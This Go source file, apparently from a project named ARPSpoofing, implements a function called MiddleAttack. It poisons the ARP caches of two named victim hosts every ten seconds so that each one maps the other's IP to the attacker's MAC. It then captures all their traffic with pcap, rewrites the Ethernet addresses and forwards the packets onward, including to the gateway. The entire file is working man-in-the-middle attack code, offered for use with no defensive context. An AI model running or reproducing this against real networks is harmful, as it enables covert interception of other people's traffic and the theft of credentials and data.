package logic

import (
	"ARPSpoofing/dao/redis"
	"ARPSpoofing/pkg/arp"
	"ARPSpoofing/settings"
	"ARPSpoofing/utils"
	"fmt"
	"log"
	"net"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

func MiddleAttack(alice, bob, gateway string) error {
	ifname, err := settings.Options.Get("ifname")
	if err != nil {
		log.Println(err)
		return err
	}
	//获取我的mac地址
	myMAC, err := utils.GetMAC(ifname)
	if err != nil {
		fmt.Println("utils.GetMAC failed,err:", err)
		return err
	}
	//获取我的IP地址
	temp, err := utils.GetIPv4(ifname)
	if err != nil {
		log.Println("get my IP failed,err:", err)
		return err
	}
	myIP := temp.String()
	//获取alice的相关信息
	hosts := redis.NewHosts()
	aliceHost, err := hosts.Get(alice)
	if err != nil {
		log.Println("hosts.Get failed,err:", err)
		return err
	}
	aliceMAC, _ := net.ParseMAC(aliceHost.MAC)
	aliceIP := net.ParseIP(aliceHost.IP)
	//获取bob的相关信息
	bobHost, err := hosts.Get(bob)
	if err != nil {
		log.Println("host.Get failed,err:", err)
		return err
	}
	bobMAC, _ := net.ParseMAC(bobHost.MAC)
	bobIP := net.ParseIP(bobHost.IP)
	//获取网关的相关信息
	gatewayHost, err := hosts.Get(gateway)
	if err != nil {
		log.Println("host.Get failed,err:", err)
		return err
	}
	gatewayMAC, _ := net.ParseMAC(gatewayHost.MAC)
	_ = gatewayMAC
	//开始监听网卡
	handle, err := pcap.OpenLive(ifname, 1600, true, pcap.BlockForever)
	if err != nil {
		log.Println("pcap.OpenLive failed,err:", err)
		return err
	}
	//欺骗双方
	go func() {
		for range time.Tick(time.Second * 10) {
			//告诉alice,我的mac地址就是bob的mac地址
			err := arp.SendARP(handle, aliceMAC, myMAC, aliceMAC, myMAC, aliceIP, bobIP, layers.ARPReply)
			if err != nil {
				log.Println("arp.SendARP failed,err:", err)
				return
			}
			//告诉bob，我的mac地址就是alice的mac地址
			err = arp.SendARP(handle, bobMAC, myMAC, bobMAC, myMAC, bobIP, aliceIP, layers.ARPReply)
			if err != nil {
				log.Println("arp.SendARP failed,err:", err)
				return
			}
		}
	}()
	//接收数据包并转发
	go func() {
		src := gopacket.NewPacketSource(handle, layers.LayerTypeEthernet)
		for packet := range src.Packets() {
			// nocopyPacket := gopacket.NewPacket(packet.Data(), layers.LayerTypeEthernet, gopacket.NoCopy)
			layer := packet.Layer(layers.LayerTypeIPv4)
			if layer == nil {
				continue
			}
			IPv4Layer, ok := layer.(*layers.IPv4)
			if !ok {
				continue
			}
			dstIP := IPv4Layer.DstIP.String()
			srcIP := IPv4Layer.SrcIP.String()
			//发给本机 或者 本机发出的包跳过
			if srcIP == myIP || dstIP == myIP {
				continue
			}

			// fmt.Println("修改前：")
			// fmt.Println(packet.String())
			//fmt.Println(packet.Data())
			//目标ip不是本机，转发（修改源mac和目的mac）
			ethlayer := packet.Layer(layers.LayerTypeEthernet)
			eth := ethlayer.(*layers.Ethernet)
			//广播包跳过
			if eth.DstMAC.String() == "ff:ff:ff:ff:ff:ff" {
				continue
			}
			//我自己发出的包跳过
			if eth.SrcMAC.String() == myMAC.String() {
				continue
			}
			eth.SrcMAC = myMAC
			// fmt.Println("aliceMAC:", aliceMAC)
			// fmt.Println("bobMAC:", bobMAC)
			// fmt.Println("gatewayMAC:", gatewayMAC)

			switch dstIP {
			case aliceHost.IP:
				if eth.DstMAC.String() == aliceMAC.String() {
					continue
				}
				eth.DstMAC = aliceMAC //如果目标ip是alice，就转发给alice
			case bobHost.IP:
				if eth.DstMAC.String() == bobMAC.String() {
					continue
				}
				eth.DstMAC = bobMAC //如果目标ip是bob，就转发给bob
			default:
				if eth.DstMAC.String() == gatewayMAC.String() {
					continue
				}
				eth.DstMAC = gatewayMAC //其他目标ip的包一律转发给网关
			}
			// fmt.Println("修改后：")
			// fmt.Println(packet.String())
			// fmt.Println(packet.Data())
			err := handle.WritePacketData(packet.Data())
			if err != nil {
				log.Println("handler.WritePakectData failed,err:", err)
				return
			}
		}
	}()

	return nil
}
